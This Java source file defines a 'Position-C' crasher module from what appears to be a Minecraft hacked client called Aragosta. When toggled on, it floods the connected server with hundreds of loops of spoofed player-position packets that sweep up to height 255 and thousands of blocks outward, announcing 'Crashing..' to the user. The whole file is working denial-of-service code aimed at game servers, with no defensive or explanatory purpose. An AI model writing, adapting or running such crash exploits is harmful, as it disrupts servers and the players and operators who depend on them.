package it.thatskai.aragosta.module.crasher;

import it.thatskai.aragosta.AragostaMain;
import it.thatskai.aragosta.annotations.modules.IModule;
import it.thatskai.aragosta.annotations.modules.Module;
import it.thatskai.aragosta.module.Category;
import it.thatskai.aragosta.settings.Setting;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C03PacketPlayer;

import static it.thatskai.aragosta.utils.MessageUtils.sendMessage;

@IModule(
        name = "Position-C",
        key = 0,
        category = Category.CRASHERS
)
public class PositionCModule extends Module {

    public void setup(){
        AragostaMain.instance.settingsManager.rSetting(new Setting(getName(), this, 430, 40, 1000, true));
    }
    int index;
    public void onEnable() {
        int packets = (int) AragostaMain.instance.settingsManager.getSettingByName(getName()).getValDouble();
        sendMessage("Mandando " + packets + " pacchetti con il metodo "+getName(), true);
        double posX = Minecraft.getMinecraft().thePlayer.posX, posY = Minecraft.getMinecraft().thePlayer.posY, posZ = Minecraft.getMinecraft().thePlayer.posZ;
        for (int index = 0; index < packets; index++) {
            double y;
            for (y = Minecraft.getMinecraft().thePlayer.posY; y < 255.0D; y += 5.0D) {
                Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.getMinecraft().thePlayer.posX, y, Minecraft.getMinecraft().thePlayer.posZ, Minecraft.getMinecraft().thePlayer.onGround));
            }
            for (int xz = 0; xz < 6685; xz += 5) {
                Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.getMinecraft().thePlayer.posX + xz, 255.0D, Minecraft.getMinecraft().thePlayer.posZ + xz, Minecraft.getMinecraft().thePlayer.onGround));
            }
        }
        Minecraft.getMinecraft().thePlayer.setPosition(posX, posY, posZ);
        sendMessage("&7Crashing..", false);
        toggle();
    }
}
